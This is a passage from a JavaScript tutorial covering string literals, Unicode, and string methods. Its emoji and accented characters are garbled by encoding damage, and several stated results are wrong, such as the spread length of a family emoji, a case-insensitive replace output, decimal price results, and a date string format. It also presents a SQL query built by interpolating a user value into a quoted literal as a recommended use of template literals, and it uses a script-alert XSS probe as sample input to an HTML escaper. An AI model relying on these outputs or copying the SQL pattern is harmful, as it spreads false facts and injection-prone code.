console.time('Typed');
for (let i = 0; i < typed.length; i++) {
  typed[i] = Math.random();
}
console.timeEnd('Typed');
// Typed is significantly faster for large operations

// SIMD-like operations (mental exercise)
let float32 = new Float32Array([1.0, 2.0, 3.0, 4.0]);
// JIT can optimize operations on typed arrays better
for (let i = 0; i < float32.length; i++) {
  float32[i] *= 2;  // More optimizable than regular array
}
```

## 7.9 Arrays Summary

| Category | Methods |
|----------|---------|
| **Mutating** | `push`, `pop`, `shift`, `unshift`, `splice`, `sort`, `reverse`, `fill` |
| **Non-mutating** | `slice`, `concat`, `flat`, `flatMap`, `toSorted`, `toReversed`, `toSpliced` |
| **Iteration** | `forEach`, `map`, `filter`, `reduce`, `find`, `some`, `every` |
| **Search** | `indexOf`, `includes`, `find`, `findIndex`, `findLast` |

---

**End of Chapter 7: Arrays**


# 08-Strings.md

# 8 Strings

Strings are immutable sequences of UTF-16 code units. This chapter covers string creation, manipulation methods, template literals, and internationalization.

---

## 8.1 String Basics

**Strings** are immutable sequences of characters. JavaScript has three ways to create strings and various mechanisms for accessing and manipulating characters.

---

### 8.1.1 String Literals

**String literals** define strings using quotes or template literals. All three formats create the same String primitive type.

```javascript
// Single quotes
let str1 = 'Hello';
typeof str1                 // 'string'

// Double quotes
let str2 = "World";
typeof str2                 // 'string'

// Backticks (template literals - covered in 8.3)
let str3 = `Template`;
typeof str3                 // 'string'

// All equivalent
str1 === str1;              // true (same value)
str1 == str2.toLowerCase(); // false (different content)

// Escape sequences
let escaped = 'It\'s working';  // Single quote in single-quoted string
escaped                     // "It's working"

let doubled = "He said \"Hi\"";  // Double quote in double-quoted string
doubled                     // 'He said "Hi"'

// Common escape sequences
let tab = "Hello\tWorld";       // Tab character
let newline = "Line1\nLine2";   // Newline
let backslash = "C:\\Users";    // Backslash

// Unicode escapes
let unicode = "\u0048\u0065\u006C\u006C\u006F";
unicode                     // 'Hello'

// Hex escapes
let hex = "\x48\x65\x6C\x6C\x6F";
hex                         // 'Hello'

// No implicit conversion
let str = 'hello';
str[0];                     // 'h'
str['length'];              // 5

// Quote preference (usually single or template)
// Pick one style and be consistent
const style1 = 'Use single quotes';
const style2 = `Or template literals`;

// Mixing quotes (no escaping needed)
let mixed1 = "It's fine here";
let mixed2 = 'She said "Hello"';

// String concatenation (avoid, use template literals instead)
let old = 'Hello' + ' ' + 'World';  // âŒ Dated style
old                         // 'Hello World'

// Better
let modern = `Hello World`;         // âœ“ Template literal
let better = 'Hello'.concat(' World');  // âœ“ concat() method
```

**String Primitives vs String Objects:**

```javascript
// Primitive string (most common)
let primitive = 'hello';
typeof primitive;           // 'string'
primitive === primitive;    // true

// String object (rarely used)
let object = new String('hello');
typeof object;              // 'object'
object === object;          // true (same object reference)
primitive === object;       // false (different types)

// Primitive when using string literals
let str = 'hello';
str instanceof String;      // false (primitive)

// Object when using new String()
let obj = new String('hello');
obj instanceof String;      // true (object)

// Both support string methods (auto-boxing)
primitive.charAt(0);        // 'h' - works on primitive
object.charAt(0);           // 'h' - works on object

// But primitives are more efficient
// JavaScript engine auto-boxes primitives temporarily

// Gotcha: object comparison
let obj1 = new String('hello');
let obj2 = new String('hello');
obj1 === obj2;              // false (different object references)
obj1.valueOf() === obj2.valueOf();  // true (same value)

// Always use primitives, not objects
let correct = 'string';
let incorrect = new String('string');
```

---

### 8.1.2 Template Literals

**Template literals** use backticks and support expression interpolation and multi-line strings.

```javascript
// Basic template
let str = `Hello World`;
str                         // 'Hello World'

// Expression interpolation with ${}
let name = 'Alice';
let greeting = `Hello, ${name}!`;
greeting                    // 'Hello, Alice!'

// Complex expressions
let a = 5, b = 10;
let result = `${a} + ${b} = ${a + b}`;
result                      // '5 + 10 = 15'

// Function calls in expressions
function getName() {
  return 'Bob';
}

let greeting2 = `Welcome, ${getName()}!`;
greeting2                   // 'Welcome, Bob!'

// Object property access
let user = { name: 'Charlie', age: 25 };
let info = `${user.name} is ${user.age} years old`;
info                        // 'Charlie is 25 years old'

// Nested templates
let outer = `outer: ${`inner`}`;
outer                       // 'outer: inner'

// Multi-line strings (preserved)
let multiline = `Line 1
Line 2
Line 3`;
multiline                   // 'Line 1\nLine 2\nLine 3'

// Indentation is preserved (careful!)
let indented = `
  This is indented
    More indented
  Back to first level
`;
// Contains leading newline and spaces!

// Better: use backslash or join
let clean = `
  This is indented
  Still indented
  No extra spaces
`.trim();

// Join array of lines
let lines = ['Line 1', 'Line 2', 'Line 3'];
let joined = lines.join('\n');
joined                      // 'Line 1\nLine 2\nLine 3'

// Escape sequences work in templates
let escaped = `Tab:\tNewline:\n`;
escaped                     // 'Tab:  Newline:\n'

// Dollar sign escaping
let dollar = `Price: $100`;
dollar                      // 'Price: $100' (no interpolation)

let escaped$ = `Price: \${amount}`;  // Escape ${}
escaped$                    // 'Price: ${amount}'

// Tag functions (covered in 8.3)
function tag(strings, ...values) {
  return 'Tagged template';
}

let tagged = tag`Hello ${'World'}`;
tagged                      // 'Tagged template'
```

**Benefits and Use Cases:**

```javascript
// Clean multi-line HTML
let html = `
  <div class="card">
    <h1>${title}</h1>
    <p>${description}</p>
  </div>
`;

// SQL queries
let query = `
  SELECT * FROM users
  WHERE name = '${name}'
  AND age > ${minAge}
`;

// JSON-like structures
let data = `
{
  "name": "${user.name}",
  "email": "${user.email}",
  "status": "${user.status}"
}
`;

// Readable formatting
let report = `
  Report Summary
  ==============
  Total: ${total}
  Average: ${average}
  Count: ${count}
`;

// Complex computations in expressions
let data = [1, 2, 3, 4, 5];
let summary = `
  Array: [${data}]
  Length: ${data.length}
  Sum: ${data.reduce((a, b) => a + b, 0)}
  Max: ${Math.max(...data)}
`;
```

---

### 8.1.3 String Length Property

**Length property** returns the number of UTF-16 code units in the string.

```javascript
// Basic length
let str = 'Hello';
str.length;                 // 5

// Empty string
let empty = '';
empty.length;               // 0

// Spaces count
let spaced = 'H e l l o';
spaced.length;              // 9

// Special characters count as 1
let special = 'Hello!@#$%';
special.length;             // 10

// Newlines count as 1
let newline = 'Line1\nLine2';
newline.length;             // 11 (\n is one character)

// Tab counts as 1
let tabbed = 'before\tafter';
tabbed.length;              // 12 (\t is one character)

// Unicode: most characters are 1 code unit
let basic = 'cafÃ©';
basic.length;               // 4

// Some emoji are 2 code units (surrogate pairs)
let emoji = 'ðŸ˜€';
emoji.length;               // 2 (represented as surrogate pair)

// Multiple emoji
let emojis = 'ðŸ˜€ðŸ˜ðŸ˜‚';
emojis.length;              // 6 (3 emoji Ã— 2 code units each)

// Combining characters
let combined = 'Ã©';         // Single character
combined.length;            // 1

let composed = 'e\u0301';   // 'e' + combining acute accent
composed.length;            // 2 (two code units)

// Length is read-only (cannot modify)
let str2 = 'hello';
str2.length = 10;           // Silently fails or throws error (strict mode)
str2.length;                // Still 5

// Not a method, it's a property
str.length;                 // âœ“ Property access
str.length();               // âœ— TypeError: str.length is not a function

// Length in loops
let str3 = 'JavaScript';
for (let i = 0; i < str3.length; i++) {
  console.log(str3[i]);     // J, a, v, a, S, c, r, i, p, t
}

// Cache length for performance
let str4 = 'long string...';
for (let i = 0, len = str4.length; i < len; i++) {  // Slightly faster
  // Process character
}

// String-like objects also have length
let arrayLike = '12345';
arrayLike.length;           // 5

// Gotcha: UTF-16 code units, not characters
let str5 = 'ðŸ‘¨â€ðŸ‘©â€ðŸ‘§â€ðŸ‘¦';  // Family emoji (multiple code points)
str5.length;                // 25 (multiple surrogate pairs and ZWJ)
// More than visually apparent!
```

---

### 8.1.4 Character Access

**Character access** retrieves individual characters by index using bracket notation or charAt().

```javascript
// Bracket notation (ES5+)
let str = 'Hello';
str[0];                     // 'H'
str[1];                     // 'e'
str[4];                     // 'o'
str[5];                     // undefined (out of bounds)

// Negative indices (not supported)
str[-1];                    // undefined (not like arrays)

// charAt() method
str.charAt(0);              // 'H'
str.charAt(1);              // 'e'
str.charAt(5);              // '' (empty string for out of bounds)

// Difference when out of bounds
let str2 = 'abc';
str2[10];                   // undefined
str2.charAt(10);            // '' (empty string)

// charCodeAt() - get UTF-16 code
str.charCodeAt(0);          // 72 (code for 'H')
str.charCodeAt(1);          // 101 (code for 'e')

// Out of bounds charCodeAt
str.charCodeAt(10);         // NaN

// Last character
let str3 = 'JavaScript';
str3[str3.length - 1];      // 't'
str3.charAt(str3.length - 1);  // 't'

// Iteration
for (let char of 'Hello') {
  console.log(char);        // H, e, l, l, o
}

// Mapping to array
let chars = [...'Hello'];   // ['H', 'e', 'l', 'l', 'o']

// Get all characters
Array.from('Hello');        // ['H', 'e', 'l', 'l', 'o']
'Hello'.split('');          // ['H', 'e', 'l', 'l', 'o']

// Code points (for emoji and special chars)
'ðŸ˜€'.charCodeAt(0);         // 55357 (first surrogate)
'ðŸ˜€'.charCodeAt(1);         // 56832 (second surrogate)

// codePointAt() - handle surrogate pairs
'ðŸ˜€'.codePointAt(0);        // 128512 (actual code point)

// Common pattern: character frequency
function charFrequency(str) {
  let freq = {};
  for (let char of str) {
    freq[char] = (freq[char] || 0) + 1;
  }
  return freq;
}

charFrequency('hello');     // { h: 1, e: 1, l: 2, o: 1 }

// Check if character exists
let str4 = 'JavaScript';
str4.includes('a');         // true
str4.indexOf('a') !== -1;   // true

// Bracket notation vs charAt()
// Bracket: returns undefined for out of bounds (consistent with arrays)
// charAt: returns empty string (more forgiving)

// Performance note
// Both bracket notation and charAt() are O(1) - equally fast
```

---

### 8.1.5 Unicode and Code Points

**Unicode** represents characters using code points. JavaScript uses UTF-16 encoding, which requires surrogates for some characters.

```javascript
// Basic ASCII - single code unit
let ascii = 'Hello';
ascii.length;               // 5 (5 code units)

// Extended Latin - single code unit
let extended = 'cafÃ©';
extended.length;            // 4 (4 code units)

// Emoji - surrogate pairs (2 code units each)
let emoji = 'ðŸ˜€';
emoji.length;               // 2 (1 emoji = 2 code units in UTF-16)

// charCodeAt() - UTF-16 code unit (0-65535)
'A'.charCodeAt(0);          // 65
'Ã©'.charCodeAt(0);          // 233
'ðŸ˜€'.charCodeAt(0);         // 55357 (first half of surrogate pair)

// codePointAt() - Unicode code point
'A'.codePointAt(0);         // 65
'Ã©'.codePointAt(0);         // 233
'ðŸ˜€'.codePointAt(0);        // 128512 (actual code point)

// String.fromCharCode() - from UTF-16 code units
String.fromCharCode(65);    // 'A'
String.fromCharCode(233);   // 'Ã©'

// Emoji requires two code units
String.fromCharCode(55357, 56832);  // 'ðŸ˜€'

// String.fromCodePoint() - from code points (better)
String.fromCodePoint(65);   // 'A'
String.fromCodePoint(233);  // 'Ã©'
String.fromCodePoint(128512);  // 'ðŸ˜€' (single parameter)

// BMP (Basic Multilingual Plane) - 0 to 65535
// Supplementary Planes - 65536 and above (needs surrogates)

let str = 'AðŸ˜€Z';           // Mix of BMP and supplementary
str.length;                 // 4 (A=1, ðŸ˜€=2, Z=1)

// Iterating with proper Unicode support
for (let codePoint of 'AðŸ˜€Z') {
  console.log(codePoint);   // A, ðŸ˜€, Z (correct!)
}

// Splitting breaks emoji
'AðŸ˜€Z'.split('');           // ['A', '?', '?', 'Z'] - broken!

// Using Array.from() or spread handles Unicode correctly
[...'AðŸ˜€Z'];               // ['A', 'ðŸ˜€', 'Z'] - correct!
Array.from('AðŸ˜€Z');        // ['A', 'ðŸ˜€', 'Z'] - correct!

// Counting characters (considering Unicode)
function countCharacters(str) {
  return [...str].length;   // Correct count
}

countCharacters('hello');   // 5
countCharacters('ðŸ˜€ðŸ˜ðŸ˜‚');   // 3 (not 6!)

// Combining characters (diacritics)
let combining = 'e\u0301';  // 'e' + combining acute
combining.length;           // 2 (two code units)
[...combining].length;      // 2 (still two characters)

// Normalized form
let nfc = combining.normalize('NFC');  // Composed
nfc.length;                 // 1 ('Ã©' as single character)

let nfd = combining.normalize('NFD');  // Decomposed
nfd.length;                 // 2 ('e' + combining)

// Emoji with variation selector
let heartRed = 'â¤ï¸';        // 2-3 code units (emoji + variation selector)
heartRed.length;            // 3

// ZWJ (Zero-Width Joiner) sequences
let family = 'ðŸ‘¨â€ðŸ‘©â€ðŸ‘§â€ðŸ‘¦';       // Family emoji (multiple parts)
family.length;              // 25 (complex!)
[...family].length;         // 1 (correct display unit)

// Safe character access (handles surrogate pairs)
function getCharAt(str, index) {
  let chars = [...str];     // Break into proper characters
  return chars[index];
}

getCharAt('AðŸ˜€Z', 1);      // 'ðŸ˜€' (correct, not broken)

// Case conversion with Unicode
'ÃŸ'.toUpperCase();          // 'SS' (German sharp s)
'I'.toLowerCase();          // 'i'
'Ä°'.toLowerCase();          // 'iÌ‡' (Turkish capital I with dot)

// Locale considerations
// Case conversion may produce multiple characters in some locales
```

---

### 8.1.6 Converting Array-like to Strings

**Conversion methods** transform various types into strings for manipulation.

```javascript
// String() constructor
String(123);                // '123'
String(true);               // 'true'
String(null);               // 'null'
String(undefined);          // 'undefined'
String([1, 2, 3]);          // '1,2,3'

// toString() method
let num = 123;
num.toString();             // '123'
true.toString();            // 'true'
[1, 2, 3].toString();       // '1,2,3'

// Difference: String() vs toString()
String(null);               // 'null'
null.toString();            // TypeError: Cannot read property

String(undefined);          // 'undefined'
undefined.toString();       // TypeError: Cannot read property

// Template literal (implicit conversion)
let value = 123;
`Value: ${value}`;          // 'Value: 123'

// Concatenation (implicit conversion)
let result = 'Count: ' + 5;
result                      // 'Count: 5'

// Plus operator (ambiguous)
'5' + 5;                    // '55' (string concatenation)
5 + '5';                    // '55' (string concatenation)
5 + 5;                      // 10 (numeric addition)

// Array to string
let arr = [1, 2, 3];
arr.toString();             // '1,2,3'
String(arr);                // '1,2,3'

// With custom separator (use join)
arr.join(', ');             // '1, 2, 3'

// Nested arrays
let nested = [1, [2, 3], 4];
nested.toString();          // '1,2,3,4'
nested.join(' | ');         // '1 | 2,3 | 4'

// Object to string
let obj = { a: 1, b: 2 };
String(obj);                // '[object Object]'
obj.toString();             // '[object Object]'

// Better: JSON.stringify
JSON.stringify(obj);        // '{"a":1,"b":2}'

// Number formatting
let num2 = 3.14159;
num2.toString();            // '3.14159'
num2.toFixed(2);            // '3.14' (string)
num2.toExponential();       // '3.14159e+0' (string)

// Boolean to string (rarely needed)
String(true);               // 'true'
String(false);              // 'false'

// Date to string
let date = new Date();
String(date);               // '2024-02-08T20:30:00.000Z'
date.toString();            // Longer format

// Symbol to string (special case)
let sym = Symbol('id');
String(sym);                // 'Symbol(id)'
sym.toString();             // 'Symbol(id)'

// Function to string
let fn = function add(a, b) { return a + b; };
fn.toString();              // 'function add(a, b) { return a + b; }'

// Arrow function
let arrow = (x) => x * 2;
arrow.toString();           // '(x) => x * 2'

// Implicit conversions in operations
5 + '5' + 5;                // '555' (all string concatenation)
5 - '5';                    // 0 (numeric subtraction)
5 * '2';                    // 10 (numeric multiplication)
'10' / '2';                 // 5 (numeric division)

// Explicit string coercion is clearer
let count = 42;
let message = String(count);  // Explicit
let message2 = `${count}`;    // Template (clear intent)
let message3 = count + '';    // Implicit (avoid)
```

**Best Practices:**

```javascript
// âœ“ Use template literals for clarity
let str = `Value: ${value}`;

// âœ“ Use String() for explicit conversion
let str2 = String(value);

// âœ“ Use toString() when method available
let str3 = arr.toString();

// âœ“ Use join() for array with separator
let str4 = arr.join(', ');

// âœ— Avoid implicit string concatenation
let str5 = 'Value: ' + value;  // Outdated

// âœ— Avoid += for multiple concatenations
let str6 = '';
for (let item of items) {
  str6 += item;  // Inefficient
}

// âœ“ Better: use join()
let str7 = items.join('');

// âœ“ Or array accumulation
let str8 = items.reduce((acc, item) => acc + item, '');
```
## 8.2 String Methods

**String methods** allow searching, manipulation, and transformation of strings. All methods return new strings (strings are immutable).

---

### 8.2.1 Character Code Methods

**Character code methods** retrieve numeric representations of characters.

```javascript
// charAt() - get character at index
let str = 'Hello';
str.charAt(0);              // 'H'
str.charAt(4);              // 'o'
str.charAt(10);             // '' (empty string, out of bounds)

// charCodeAt() - get UTF-16 code of character
str.charCodeAt(0);          // 72
str.charCodeAt(1);          // 101
str.charCodeAt(10);         // NaN (out of bounds)

// codePointAt() - get Unicode code point
'A'.codePointAt(0);         // 65
'Ã©'.codePointAt(0);         // 233
'ðŸ˜€'.codePointAt(0);        // 128512

// Difference: charCodeAt vs codePointAt
let emoji = 'ðŸ˜€';
emoji.charCodeAt(0);        // 55357 (first surrogate)
emoji.codePointAt(0);       // 128512 (actual code point)

// fromCharCode() - create string from UTF-16 codes (static)
String.fromCharCode(65, 66, 67);  // 'ABC'
String.fromCharCode(72, 101, 108, 108, 111);  // 'Hello'

// For emoji, need both surrogates
String.fromCharCode(55357, 56832);  // 'ðŸ˜€'

// fromCodePoint() - create from code points (static, ES2015)
String.fromCodePoint(65, 66, 67);  // 'ABC'
String.fromCodePoint(128512);      // 'ðŸ˜€' (single parameter)

// at() - ES2022 method, supports negative indices
let str2 = 'JavaScript';
str2.at(0);                 // 'J'
str2.at(-1);                // 't' (last character)
str2.at(-2);                // 'p' (second from end)

// Comparison: charAt() vs at()
str2.charAt(-1);            // '' (negative index not supported)
str2.at(-1);                // 't' (works!)

// Real-world pattern: get last character
function lastChar(str) {
  return str.at(-1) ?? '';  // Using at() or fallback
}

lastChar('hello');          // 'o'
lastChar('');               // ''

// Character frequency counter
function charFrequency(str) {
  let freq = {};
  for (let i = 0; i < str.length; i++) {
    let char = str.charAt(i);
    freq[char] = (freq[char] || 0) + 1;
  }
  return freq;
}

charFrequency('hello');     // { h: 1, e: 1, l: 2, o: 1 }

// Character code to ASCII art
function getCharCodes(str) {
  let codes = [];
  for (let i = 0; i < str.length; i++) {
    codes.push(str.charCodeAt(i));
  }
  return codes;
}

getCharCodes('ABC');        // [65, 66, 67]

// Range check (is character in range)
function isDigit(char) {
  let code = char.charCodeAt(0);
  return code >= 48 && code <= 57;  // '0' to '9'
}

isDigit('5');               // true
isDigit('a');               // false

// Case detection
function isUpperCase(char) {
  return char === char.toUpperCase() && char !== char.toLowerCase();
}

isUpperCase('A');           // true
isUpperCase('a');           // false
isUpperCase('5');           // false
```

---

### 8.2.2 Searching and Matching

**Search methods** find substrings or patterns within strings.

```javascript
// indexOf() - find first occurrence
let str = 'Hello World Hello';
str.indexOf('o');           // 4 (first 'o')
str.indexOf('World');       // 6
str.indexOf('xyz');         // -1 (not found)

// indexOf() with start position
str.indexOf('o', 5);        // 7 (search from index 5)
str.indexOf('Hello', 1);    // 12 (second 'Hello')

// lastIndexOf() - find last occurrence
str.lastIndexOf('o');       // 16 (last 'o')
str.lastIndexOf('Hello');   // 12 (last 'Hello')
str.lastIndexOf('Hello', 11);  // 0 (search backwards from index 11)

// includes() - check if substring exists
str.includes('World');      // true
str.includes('xyz');        // false

// includes() with position
str.includes('Hello', 1);   // true (search from index 1)
str.includes('Hello', 13);  // false (only after index 12)

// startsWith() - check beginning
str.startsWith('Hello');    // true
str.startsWith('World');    // false

// startsWith() with position
str.startsWith('World', 6); // true (position 6)

// endsWith() - check ending
str.endsWith('Hello');      // true
str.endsWith('World');      // false

// endsWith() with length parameter
str.endsWith('World', 11);  // true (treat as if length 11)

// search() - find regex match position
let text = 'The price is $50';
text.search(/\$\d+/);       // 13 (position of match)
text.search(/xyz/);         // -1 (not found)

// match() - find all matches
let text2 = 'cat bat hat';
text2.match(/at/);          // ['at'] (first match without 'g' flag)
text2.match(/at/g);         // ['at', 'at', 'at'] (all matches)

// match() with groups
let email = 'user@example.com';
email.match(/(\w+)@(\w+)/);
// ['user@example', 'user', 'example'] (with groups)

// matchAll() - get all matches with groups (ES2020)
let text3 = 'cat123bat456';
let matches = [...text3.matchAll(/(\w+)(\d+)/g)];
// Each match includes groups

// Pattern matching
function findAll(str, pattern) {
  let matches = [];
  let match;
  let regex = new RegExp(pattern, 'g');
  while ((match = regex.exec(str)) !== null) {
    matches.push(match[0]);
  }
  return matches;
}

findAll('hello world hello', 'hello');  // ['hello', 'hello']

// Case-insensitive search
let str2 = 'Hello HELLO hello';
str2.indexOf('hello');      // -1 (case-sensitive)
str2.toLowerCase().indexOf('hello');  // 0 (case-insensitive)

// Find all positions
function findAllIndices(str, substring) {
  let indices = [];
  let pos = 0;
  while ((pos = str.indexOf(substring, pos)) !== -1) {
    indices.push(pos);
    pos += substring.length;
  }
  return indices;
}

findAllIndices('hello hello hello', 'hello');  // [0, 6, 12]

// URL parameter extraction
function getParam(url, param) {
  let regex = new RegExp(`[?&]${param}=([^&]*)`);
  let match = url.match(regex);
  return match ? match[1] : null;
}

getParam('https://example.com?id=123&name=test', 'name');
// 'test'
```

---

### 8.2.3 String Replacement

**Replacement methods** modify string content.

```javascript
// replace() - replace first occurrence
let str = 'hello world hello';
str.replace('hello', 'hi');  // 'hi world hello'

// replace() with regex
str.replace(/hello/g, 'hi');  // 'hi world hi'

// replace() with function
str.replace(/hello/g, function(match) {
  return match.toUpperCase();
});
// 'HELLO world HELLO'

// replaceAll() - replace all occurrences (ES2021)
str.replaceAll('hello', 'hi');  // 'hi world hi'

// Replacement with groups
let text = 'John Smith';
text.replace(/(\w+) (\w+)/, '$2, $1');  // 'Smith, John'

// Function replacement with groups
let date = '2024-02-08';
date.replace(/(\d{4})-(\d{2})-(\d{2})/, (match, year, month, day) => {
  return `${day}/${month}/${year}`;
});
// '08/02/2024'

// Advanced replacement function
let text2 = 'The price is $50 and the tax is $10';
text2.replace(/\$(\d+)/g, (match, price) => {
  return `$${parseInt(price) * 1.1}`;  // 10% increase
});
// 'The price is $55 and the tax is $11'

// HTML escaping
function escapeHTML(str) {
  return str
    .replace(/&/g, '&amp;')
    .replace(/</g, '&lt;')
    .replace(/>/g, '&gt;')
    .replace(/"/g, '&quot;')
    .replace(/'/g, '&#39;');
}

escapeHTML('<script>alert("XSS")</script>');
// '&lt;script&gt;alert(&quot;XSS&quot;)&lt;/script&gt;'

// Word replacement (whole word only)
let text3 = 'cat concatenate scatter';
text3.replace(/\bcat\b/g, 'dog');  // 'dog concatenate scatter'

// Case-insensitive replacement
text3.replace(/cat/i, 'dog');     // 'dog concatenate scatter' (first only)
text3.replace(/cat/gi, 'dog');    // 'dog dogcatenate scatdog' (all)

// Template-like replacement
function interpolate(str, data) {
  return str.replace(/\{(\w+)\}/g, (match, key) => {
    return data[key] || match;
  });
}

interpolate('Hello {name}, you are {age} years old', 
  { name: 'Alice', age: 25 });
// 'Hello Alice, you are 25 years old'

// Capitalize each word
function capitalizeWords(str) {
  return str.replace(/\b\w/g, char => char.toUpperCase());
}

capitalizeWords('hello world');  // 'Hello World'

// Trim and replace extra spaces
function normalizeSpaces(str) {
  return str.trim().replace(/\s+/g, ' ');
}

normalizeSpaces('  hello    world  ');  // 'hello world'

// Remove duplicates
function removeDuplicates(str) {
  return str.replace(/(.)\1+/g, '$1');
}

removeDuplicates('hellooo wooorld');  // 'helo world'

// Split, process, rejoin pattern (alternative)
str.split(' ').map(word => word.toUpperCase()).join(' ');
// More explicit than regex replacement

// Performance: replace vs replaceAll
let str2 = 'hello hello hello';
str2.replace(/hello/g, 'hi');      // Works (regex)
str2.replaceAll('hello', 'hi');    // Works (ES2021)
// replaceAll is clearer for simple string replacement
```

---

### 8.2.4 String Extraction

**Extraction methods** get portions of strings.

```javascript
// slice() - extract substring
let str = 'JavaScript';
str.slice(0, 4);            // 'Java'
str.slice(4);               // 'Script'
str.slice(-6);              // 'Script' (last 6 chars)
str.slice(-6, -2);          // 'Scrip'

// substring() - similar to slice (older)
str.substring(0, 4);        // 'Java'
str.substring(4);           // 'Script'

// Difference: negative indices
str.slice(-3);              // 'pto' (last 3)
str.substring(-3);          // 'JavaScript' (treats -3 as 0)

// substr() - deprecated, avoid
str.substr(0, 4);           // 'Java' (but don't use)

// split() - break into array
let text = 'hello world test';
text.split(' ');            // ['hello', 'world', 'test']

// split() without separator
'hello'.split('');          // ['h', 'e', 'l', 'l', 'o']

// split() with limit
text.split(' ', 2);         // ['hello', 'world']

// split() with regex
'hello123world456'.split(/\d+/);  // ['hello', 'world', '']

// join() - opposite of split
let arr = ['hello', 'world'];
arr.join(' ');              // 'hello world'
arr.join('-');              // 'hello-world'

// Common pattern: split and map
let csv = 'a,b,c';
csv.split(',').map(x => x.toUpperCase());  // ['A', 'B', 'C']

// Extract filename
function getFilename(path) {
  return path.split('/').pop();  // Last part after slash
}

getFilename('/path/to/file.js');  // 'file.js'

// Extract extension
function getExtension(filename) {
  return filename.slice(filename.lastIndexOf('.') + 1);
}

getExtension('file.js');    // 'js'

// Extract domain from email
function getDomain(email) {
  return email.split('@')[1];
}

getDomain('user@example.com');  // 'example.com'

// First N characters
function first(str, n) {
  return str.slice(0, n);
}

first('JavaScript', 4);     // 'Java'

// Last N characters
function last(str, n) {
  return str.slice(-n);
}

last('JavaScript', 6);      // 'Script'

// Truncate with ellipsis
function truncate(str, length) {
  return str.length > length ? str.slice(0, length) + '...' : str;
}

truncate('JavaScript is fun', 10);  // 'JavaScript...'

// Middle extraction
function middle(str, start, length) {
  return str.slice(start, start + length);
}

middle('JavaScript', 4, 6);  // 'Script'

// Word wrapping
function wrap(str, width) {
  return str.match(new RegExp(`.{1,${width}}`, 'g')).join('\n');
}

wrap('HelloWorld', 5);
// 'Hello\nWorld'

// Case conversion
let str2 = 'Hello World';
str2.toLowerCase();         // 'hello world'
str2.toUpperCase();         // 'HELLO WORLD'

// toLocaleLowerCase() / toLocaleUpperCase()
'Ä°'.toLocaleLowerCase('tr');  // 'i' (Turkish)
'i'.toLocaleUpperCase('tr');  // 'Ä°' (Turkish)
```

---

### 8.2.5 String Transformation

**Transformation methods** change string format or structure.

```javascript
// concat() - join strings
let str = 'Hello';
str.concat(' ', 'World');   // 'Hello World'

// With multiple arguments
str.concat(' ', 'World', '!');  // 'Hello World!'

// repeat() - repeat string N times
'abc'.repeat(3);            // 'abcabcabc'
'*'.repeat(5);              // '*****'

// Template repeat
'â–ˆ'.repeat(10);             // Progress bar

// padStart() - pad beginning to length
'5'.padStart(3, '0');       // '005'
'42'.padStart(4, '0');      // '0042'

// padEnd() - pad ending to length
'5'.padEnd(3, '0');         // '500'

// Array column formatting
function formatColumn(arr, width) {
  return arr.map(item => String(item).padEnd(width));
}

formatColumn(['a', 'bb', 'ccc'], 5);
// ['a    ', 'bb   ', 'ccc  ']

// Table alignment
function rightAlign(str, width) {
  return str.padStart(width);
}

console.log(rightAlign('42', 5));  // '   42'

// trim() - remove leading/trailing whitespace
'  hello  '.trim();         // 'hello'

// trimStart() / trimLeft()
'  hello  '.trimStart();    // 'hello  '

// trimEnd() / trimRight()
'  hello  '.trimEnd();      // '  hello'

// normalize() - Unicode normalization
let str2 = 'Ã©';            // Composed form
str2.normalize('NFC');      // Composed (canonical)
str2.normalize('NFD');      // Decomposed

// localeCompare() - locale-aware comparison
'a'.localeCompare('b');     // -1 (a < b)
'b'.localeCompare('a');     // 1 (b > a)
'a'.localeCompare('a');     // 0 (equal)

// Sorting with localeCompare
let names = ['Zebra', 'Apple', 'banana'];
names.sort((a, b) => a.localeCompare(b));
// ['Apple', 'banana', 'Zebra']

// Case-sensitive vs case-insensitive
'ABC'.localeCompare('abc');  // Negative (uppercase typically first)
'ABC'.localeCompare('abc', undefined, { sensitivity: 'base' });
// 0 (treats as equal ignoring case)

// Common text processing
function cleanText(str) {
  return str
    .trim()
    .replace(/\s+/g, ' ')
    .toLowerCase();
}

cleanText('  Hello   WORLD  ');  // 'hello world'

// Slug generation
function toSlug(str) {
  return str
    .toLowerCase()
    .trim()
    .replace(/[^\w\s-]/g, '')     // Remove special chars
    .replace(/\s+/g, '-')          // Replace spaces with hyphens
    .replace(/-+/g, '-');          // Remove duplicate hyphens
}

toSlug('Hello World! How are you?');  // 'hello-world-how-are-you'

// Camel case to kebab case
function toKebabCase(str) {
  return str
    .replace(/([a-z])([A-Z])/g, '$1-$2')
    .toLowerCase();
}

toKebabCase('helloWorld');  // 'hello-world'

// Kebab case to camel case
function toCamelCase(str) {
  return str
    .split('-')
    .map((word, i) => i === 0 ? word : word.charAt(0).toUpperCase() + word.slice(1))
    .join('');
}

toCamelCase('hello-world');  // 'helloWorld'
```

---

### 8.2.6 Advanced Pattern Matching

```javascript
// Check if string is all uppercase
function isAllUppercase(str) {
  return str === str.toUpperCase() && str !== str.toLowerCase();
}

isAllUppercase('HELLO');    // true
isAllUppercase('Hello');    // false
isAllUppercase('123');      // false

// Check if string is palindrome
function isPalindrome(str) {
  let clean = str.toLowerCase().replace(/[^a-z0-9]/g, '');
  return clean === clean.split('').reverse().join('');
}

isPalindrome('A man a plan a canal Panama');  // true

// Check if anagrams
function areAnagrams(str1, str2) {
  let sort = s => s.toLowerCase().split('').sort().join('');
  return sort(str1) === sort(str2);
}

areAnagrams('listen', 'silent');  // true

// URL validation pattern
function isValidURL(str) {
  return /^https?:\/\/.+$/.test(str);
}

isValidURL('https://example.com');  // true

// Email validation pattern
function isValidEmail(str) {
  return /^[^\s@]+@[^\s@]+\.[^\s@]+$/.test(str);
}

isValidEmail('user@example.com');  // true

// Phone number formatting
function formatPhone(str) {
  let cleaned = str.replace(/\D/g, '');
  return cleaned.replace(/(\d{3})(\d{3})(\d{4})/, '($1) $2-$3');
}

formatPhone('1234567890');  // '(123) 456-7890'

// Credit card formatting
function formatCreditCard(str) {
  let cleaned = str.replace(/\s/g, '');
  return cleaned.replace(/(\d{4})/g, '$1 ').trim();
}

formatCreditCard('1234567890123456');  // '1234 5678 9012 3456'

// Performance: prefer simple methods over regex for simple tasks
// string.includes() is faster than regex for existence checks
'hello'.includes('ll');     // true (faster)
/ll/.test('hello');         // true (slower)

// string.startsWith() is faster than regex
'hello'.startsWith('he');   // true (faster)
/^he/.test('hello');        // true (slower)
```
## 8.3 Template Literals and Tagged Templates

**Template literals** (backtick strings) revolutionized string handling in JavaScript with expression interpolation, multi-line support, and custom processing via tag functions.

---

### 8.3.1 Basic Template Literals

